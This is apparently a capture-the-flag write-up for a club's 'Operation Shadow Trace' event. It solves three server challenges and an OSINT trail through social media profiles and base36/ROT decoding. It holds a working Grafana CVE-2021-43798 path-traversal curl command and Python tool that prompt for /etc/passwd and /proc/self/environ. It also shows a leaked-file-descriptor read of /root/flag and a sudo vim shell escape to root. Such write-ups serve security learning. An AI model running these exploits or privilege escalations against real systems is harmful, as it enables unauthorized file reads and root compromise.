# Operation-Shadow-Trace
**FLAGS:**

Grafana blog:
```
PClub{Easy LFI}
PClub{4lw4ys_cl05e_y0ur_fil3s}
PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed}
```

Kalpit Rama blog:
```
flag1:PClub{idk_how_this_got_typed}
```
## Grafana Blog
### Initial challenge:
**FLAG:** ```PClub{Easy LFI}```  
 
When reading the grafana blog, opened the link to the grafana login dashboard. We didn't have the login id and password.  
 
When searched for grafana and its vulnerability found about the ```Grafana 8.3.0 - Directory Traversal and Arbitrary File Read, CVE:2021-43798```.  
There existed vulnerability that local files can be directly transversed.  

The detail of the exploit is found in this link: 
https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p  

Used this on terminal and found the flag in return, and the next IP and port of next two challenges.
```
curl http://13.126.50.182:3000/public/plugins/tempo/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag 
```
Returned data: 
```
PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
```

Also I saw a direct transversal code when going through google, link:  
https://www.exploit-db.com/exploits/50581  
To cross check all the other plugins, I ran it with necessary changes and got the same output on other plugins too.
```
#!/usr/bin/env python3
import requests
import random
import urllib3
urllib3.disable_warnings()
PLUGIN_LIST = [ "alertlist", "annolist", "barchart", "bargauge", "candlestick", "cloudwatch", "dashlist", "elasticsearch", "gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource", "graph", "heatmap", "histogram", "influxdb", "jaeger", "logs", "loki", "mssql", "mysql", "news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres", "prometheus", "stackdriver", "stat", "state-timeline", "status-history", "table", "table-old", "tempo", "testdata", "text", "timeseries", "welcome", "zipkin" ]
TARGET = "http://13.126.50.182:3000"
SESSION = requests.Session()
HEADERS = { 'User-Agent': 'Mozilla/5.0' }
# Encoded traversal (12 levels deep)
TRAVERSAL = "%2E%2E%2F" * 12 # = ../../../../... (12 times)
def attempt_read(filepath):
   plugin = random.choice(PLUGIN_LIST)
   filepath_encoded =filepath.replace("/", "%2F")
   url = f"{TARGET}/public/plugins/{plugin}/{TRAVERSAL}{filepath_encoded}"
    print(f"🔎 Trying: {url}")
    try:
        res = SESSION.get(url, headers=HEADERS, verify=False, timeout=5)
        if res.status_code == 200 and "PClub{" in res.text:
            print(f"\n✅ FLAG FOUND at: {url}")
            print(res.text)
        elif res.status_code == 200:
            print(f"[+] File accessible — plugin '{plugin}' responded:")
            print(res.text[:300] + ("..." if len(res.text) > 300 else ""))
        elif "Found" in res.text and "/login" in res.text:
            print("🚫 Redirected to login. File may exist, but access is blocked.")
        else:
            print("[-] File not found or not readable.")
    except requests.exceptions.RequestException as e:         print(f"[!] Error accessing {url}: {e}")
def main():
    print("🎯 Grafana CVE-2021-43798 Exploit Tool — Operation Shadow Trace")
    print(f"🌐 Targeting: {TARGET}")
    print("📂 Enter paths like /tmp/flag.txt, /etc/passwd, /proc/self/environ\n")
    try:
        while True:
            filepath = input("📥 File to read: ").strip()
            if not filepath.startswith("/"):
                filepath = "/" + filepath
            attempt_read(filepath)
    except KeyboardInterrupt:
        print("\n👋 Exiting...")
if __name__ == "__main__":
    main()

... 
🎯 Grafana CVE-2021-43798 Exploit Tool — Operation Shadow Trace 🌐
Targeting: http://13.126.50.182:3000 📂
Enter paths like /tmp/flag.txt, /etc/passwd, /proc/self/environ
📥 File to read: /tmp/flag
🔎Trying: http://13.126.50.182:3000/public/plugins/opentsdb/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/opentsdb/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
🔎 Trying: http://13.126.50.182:3000/public/plugins/piechart/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/piechart/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
📥 File to read: /tmp/flag
🔎 Trying: http://13.126.50.182:3000/public/plugins/mysql/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag
✅ FLAG FOUND at: http://13.126.50.182:3000/public/plugins/mysql/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Ftmp%2Fflag PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729
```

### Challenge 2

*challenge* - 13.235.21.137:4657  

**FLAG**:```PClub{4lw4ys_cl05e_y0ur_fil3s}``` 

Connected to terminal using:
```nc 13.235.21.137 4657```

ls Gives: 
```
$ ls 
file_chal file_chal.c
``` 

Used cat to see the c script
```
$ cat file_chal.c

#include <fcntl.h>
#include <unistd.h>
int main () {
    int fd = open ("/root/flag", 0);
// Dropping root previliges
// definitely not forgetting anything
    setuid (getuid ());
    char* args[] = { "sh", 0 };
    execvp ("/bin/sh", args);
    return 0; }
``` 

We see that the code opens the flag before dropping the root privilage. The file is opened but not closed. So the file descriptor pointing to ```/root/flag``` is still valid.

Then to see the file descriptors used:
``` 
ls -l /proc/$$/fd

total 0 lrwx------ 1 ctf ctf 64 May 23 09:35 0 -> /dev/pts/24
lrwx------ 1 ctf ctf 64 May 23 09:35 1 -> /dev/pts/24
lrwx------ 1 ctf ctf 64 May 23 09:35 2 -> /dev/pts/24
lr-x------ 1 ctf ctf 64 May 23 09:35 3 -> /root/flag
```
Then tried to cat fd 3:
```
$ $ cat /proc/$$/fd/3
cat: /proc/2285/fd/3: Permission denied
```
We can't cat it directly. 
But we are already in the same process that opened fd3, so tried shell redirection: Which gives us the flag.
```
$ read line <&3
echo "$line"
$ PClub{4lw4ys_cl05e_y0ur_fil3s}
```




### Challenge 3

Challenge - ```13.235.21.137:4729``` 

**FLAG:** ```PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed} ```

First comnect with netcat:
``` nc 13.235.21.137 4729``` 

It gave:
```
/bin/sh: 0: can't access tty; job control turned off 
```
Did:
```
$ whoami
ctf
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```
So I'm a low privilage user.  
Then to see the file system , did:
```
$ ls 
$ cd .. 
$ ls
bin chal etc lib media opt root sbin sys usr boot dev home lib64 mnt proc run srv tmp var 
``` 

Then tried to list the important directories i saw:
```
$ ls /chal
ls /home 
ls /root
$ ubuntu 
$ ls: cannot open directory '/root':Permission denied 
```
So root can't be accessed.
Then tried to read common challenge locations:
```
$cat /chal/* 
cat /home/*/* 

$ cat: '/chal/*': No such file or directory 
$ cat: '/home/*/*': No such file or directory
``` 

To find any file with "flag" in its name, used:```find / -name '*flag*' 2>/dev/null```
```
$ find / -name '*flag*' 2>/dev/null 
/proc/sys/kernel/acpi_video_flags 
/proc/sys/net/ipv4/fib_notify_on_flag_change 
/proc/sys/net/ipv6/fib_notify_on_flag_change 
/proc/kpageflags 
/sys/devices/pnp0/00:06/00:06:0/00:06:0.0/tty/ttyS0/flags 
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags 
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags 
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags 
/sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/eth0/flags 
/sys/hypervisor/start_flags 
/sys/module/scsi_mod/parameters/default_dev_flags 
/tmp/recovered_flag.txt 
/tmp/flag.swp 
```
I tried some sudo command but got error that Permission denied so decided to check privilages of sudo:
```
$ sudo -l 
Matching Defaults entries for ctf on 1d6089cf076a: 
        env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty 

User ctf may run the following commands on 1d6089cf076a:
         (ALL) NOPASSWD: /bin/vim 
```
So now as we can use ```sudo/bin/vim``` we can escalate our privilages and get the root access through vim.
Then did:
```
$ sudo /bin/vim -c ':!/bin/sh' 
E558:  Terminal entry not found in terminfo 'unknown' not known. Available builtin terminals are: 

builtin_ansi
builtin_vt320
builtin_vt52
builtin_xterm
builtin_iris-ansi
builtin_pcansi
builtin_win32
builtin_amiga
builtin_dumb
builtin_debug
defaulting to 'ansi' 

```
Vim was opened ,tried to get the root access: 

```
:!/bin/sh 
/bin/sh: 0: can't access tty; job control turned off 
# whoami
root 
# ls /root 
cat /root/* flag
# PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed} 
# 
```
Got the flag.


## Kalpit Lal Rama Blog 

Search on google the name Kalpit Lal Rama. Got a linkden profile with the name.  

Went to the linkden:
https://www.linkedin.com/in/kalpit-lal-rama-58b789330/?originalSubdomain=in 

It had a profile link to Twitter(X):
https://x.com/KalP52916094 

When visited the twitter it had a reddit link:
https://www.reddit.com/user/Virtual-Copy-637/comments/1fuyetj/ 

In one of a post it had:
```
i_like_these_numbers_particularly/ numbers: 
12668958 
29326 
23627944634268 
3108 
8 
523948 
01050036027972 
87177902339084610664
``` 
Went to dcode to test the cipher, used ```dcode cipher identifier```
It showed nice probability of  ```base36``` cypher
Decrypted it with base36 decoder,got:
```
7JJFI MMM 8DIJ06H0C 2EC 8 B8A4 0DEDOC8JO IEC4J8C4IRSRS
```
After few tries, used ```ROT13 bruteforce``` on ```cyber chef```
```
Amount = 1: 7KKGJ NNN 8EJK06I0D 2FD 8 C8B4 0EFEPD8KP JFD4K8D4JSTST 
Amount = 2: 7LLHK OOO 8FKL06J0E 2GE 8 D8C4 0FGFQE8LQ KGE4L8E4KTUTU 
Amount = 3: 7MMIL PPP 8GLM06K0F 2HF 8 E8D4 0GHGRF8MR LHF4M8F4LUVUV 
Amount = 4: 7NNJM QQQ 8HMN06L0G 2IG 8 F8E4 0HIHSG8NS MIG4N8G4MVWVW 
Amount = 5: 7OOKN RRR 8INO06M0H 2JH 8 G8F4 0IJITH8OT NJH4O8H4NWXWX 
Amount = 6: 7PPLO SSS 8JOP06N0I 2KI 8 H8G4 0JKJUI8PU OKI4P8I4OXYXY 
Amount = 7: 7QQMP TTT 8KPQ06O0J 2LJ 8 I8H4 0KLKVJ8QV PLJ4Q8J4PYZYZ 
Amount = 8: 7RRNQ UUU 8LQR06P0K 2MK 8 J8I4 0LMLWK8RW QMK4R8K4QZAZA 
Amount = 9: 7SSOR VVV 8MRS06Q0L 2NL 8 K8J4 0MNMXL8SX RNL4S8L4RABAB 
Amount = 10: 7TTPS WWW 8NST06R0M 2OM 8 L8K4 0NONYM8TY SOM4T8M4SBCBC 
Amount = 11: 7UUQT XXX 8OTU06S0N 2PN 8 M8L4 0OPOZN8UZ TPN4U8N4TCDCD 
Amount = 12: 7VVRU YYY 8PUV06T0O 2QO 8 N8M4 0PQPAO8VA UQO4V8O4UDEDE 
Amount = 13: 7WWSV ZZZ 8QVW06U0P 2RP 8 O8N4 0QRQBP8WB VRP4W8P4VEFEF 
Amount = 14: 7XXTW AAA 8RWX06V0Q 2SQ 8 P8O4 0RSRCQ8XC WSQ4X8Q4WFGFG 
Amount = 15: 7YYUX BBB 8SXY06W0R 2TR 8 Q8P4 0STSDR8YD XTR4Y8R4XGHGH 
Amount = 16: 7ZZVY CCC 8TYZ06X0S 2US 8 R8Q4 0TUTES8ZE YUS4Z8S4YHIHI 
Amount = 17: 7AAWZ DDD 8UZA06Y0T 2VT 8 S8R4 0UVUFT8AF ZVT4A8T4ZIJIJ 
Amount = 18: 7BBXA EEE 8VAB06Z0U 2WU 8 T8S4 0VWVGU8BG AWU4B8U4AJKJK 
Amount = 19: 7CCYB FFF 8WBC06A0V 2XV 8 U8T4 0WXWHV8CH BXV4C8V4BKLKL 
Amount = 20: 7DDZC GGG 8XCD06B0W 2YW 8 V8U4 0XYXIW8DI CYW4D8W4CLMLM 
Amount = 21: 7EEAD HHH 8YDE06C0X 2ZX 8 W8V4 0YZYJX8EJ DZX4E8X4DMNMN 
Amount = 22: 7FFBE III 8ZEF06D0Y 2AY 8 X8W4 0ZAZKY8FK EAY4F8Y4ENONO 
Amount = 23: 7GGCF JJJ 8AFG06E0Z 2BZ 8 Y8X4 0ABALZ8GL FBZ4G8Z4FOPOP 
Amount = 24: 7HHDG KKK 8BGH06F0A 2CA 8 Z8Y4 0BCBMA8HM GCA4H8A4GPQPQ 
Amount = 25: 7IIEH LLL 8CHI06G0B 2DB 8 A8Z4 0CDCNB8IN HDB4I8B4HQRQR 
```
This looked like a valid web link:
```Amount = 10: 7TTPS WWW 8NST06R0M 2OM 8 L8K4 0NONYM8TY SOM4T8M4SBCBC``` 

Got after substitutions:```https://www.instagram.com/i_like_anonymity_sometimesbcbc``` 

But it wasnt a valid link, so just searched instagram for
```i_like_anonymity_sometimes```
Got the account as:```i_like_anonymity_sometimes```
Link:```https://www.instagram.com/i_like_anonymity_sometimes1212/``` 

Then went to highlights ```spam```. Saw a wikipedia post with written ```i hope i didn't leaked something```. Went to the wikipedia link.
Wikipedia:https://en.wikipedia.org/w/index.php?title=Thomas_Keller_Medal&action=history
We can edit the wikipedia, getting this in mind opened ```edit history```. 

Saw: 
```13:07, 13 May 2025 KapilLal20 talk contribs 12,870 bytes +107 No edit summaryundo Tag: Reverted``` 

Got the flag:```PClub{idk_how_this_got_typed}``` 

Got link to other challenges:
```https://pastebin.com/v9vuHs52``` 

Two challenge:
```
Challenge 1 : Connect to 3.109.250.1 at port 5000 
Challenge 2 : https://cybersharing.net/s/327d3991cd34b223 
```
